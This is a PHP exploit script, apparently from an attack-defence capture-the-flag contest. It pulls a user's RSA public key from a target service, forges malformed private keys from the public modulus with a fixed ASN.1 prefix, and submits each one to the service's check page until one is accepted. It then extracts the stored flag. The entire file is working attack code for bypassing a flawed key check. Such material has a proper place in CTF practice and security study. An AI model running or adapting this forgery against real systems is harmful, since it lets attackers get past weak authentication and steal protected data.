#!/usr/bin/env php
<?php

$PORT = 3000;
$CURL_OPTS = [
    CURLOPT_RETURNTRANSFER => TRUE,
    CURLOPT_TIMEOUT => 5,
    CURLOPT_FAILONERROR => TRUE,
];
$PRIVATE_PREFIX_HEX = "308204be020100300d06092a864886f70d0101010500048204a8308204a402010002820101";

function url_prefix($host) {
    global $PORT;

    if (getenv('CHECKER_DIRECT_CONNECT') == '1') {
        return "http://$host:$PORT";
    }
    return "https://$host";
}

function get_public_key($url_prefix, $login) {
    global $CURL_OPTS;

    $url = "$url_prefix/key.php?login=$login";
    $ch = curl_init($url);
    curl_setopt_array($ch, $CURL_OPTS);

    $result = curl_exec($ch);
    $err = curl_error($ch);
    curl_close($ch);
    if ($err) {
        throw new Exception("Cant get public key for '$login' : '$err' : $result");
    }

    if (!preg_match('/.*(-----BEGIN PUBLIC KEY-----.*-----END PUBLIC KEY-----).*/ms', $result, $matches)) {
        throw new Exception("Cant find public key for '$login' : $result");
    }

    $public_key = $matches[1];
    return $public_key;
}

function generate_fake_private_keys($public_key) {
    global $PRIVATE_PREFIX_HEX;

    $public_key = str_replace('-----BEGIN PUBLIC KEY-----', '', $public_key);
    $public_key = str_replace('-----END PUBLIC KEY-----', '', $public_key);

    $public_key_decoded = base64_decode($public_key);
    $public_key_decoded_unpacked  = unpack('H*', $public_key_decoded)[1];
    $modulus = substr($public_key_decoded_unpacked, 64);

    $private_prefix_hex = $PRIVATE_PREFIX_HEX;
    $fake_private_key = $private_prefix_hex . $modulus;
    foreach(['a', 'b', 'c', 'd', 'e', 'f'] as $a) {
        $fake_private_key[7] = $a;
        $fake_private_key[51] = '4' + ord($a) - ord('a');
        $fake_private_key[52] = '3';
        $fake_private_key[53] = '0';
        $fake_private_key[59] = '0' + ord($a) - ord('a');

        $fake_private_key_pem = "-----BEGIN PRIVATE KEY-----\n" . base64_encode(pack('H*', $fake_private_key));

        yield $fake_private_key_pem;
    }
}

function get_flag($url_prefix, $login, $private_key) {
    global $CURL_OPTS;

    $url = "$url_prefix/check.php";

    $headers = array(
        "Content-Type: application/x-www-form-urlencoded",
    );
    $data = "login=$login&private_key=" . urlencode($private_key);

    $ch = curl_init($url);
    curl_setopt_array($ch, $CURL_OPTS);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_POST, TRUE);

    $result = curl_exec($ch);
    $err = curl_error($ch);
    curl_close($ch);

    if ($err) {
        return FALSE;
    }

    if (!preg_match('/.*comment: (.*?=)/ms', $result, $matches)) {
        throw new Exception("Cant find flag in result: '$login' : $result");
    }

    $flag = $matches[1];
    return $flag;
}

function main($argv) {
    $host = $argv[1];
    $flag_id = $argv[2];  # See public_flag_id checksystem API
    $url_prefix = url_prefix($host);

    $public_key_pem = get_public_key($url_prefix, $flag_id);

    $flag_from_service = '';
    foreach (generate_fake_private_keys($public_key_pem) as $fake_private_key_pem) {
        $flag_from_service = get_flag($url_prefix, $flag_id, $fake_private_key_pem);
        if ($flag_from_service) {
            break;
        }
    }

    if (!$flag_from_service) {
        throw new Exception("CANT GET FLAG: login:$$flag_id, flag_from_service:$flag_from_service; So sad :(");
    }

    print("$flag_from_service\n");
}

main($argv);
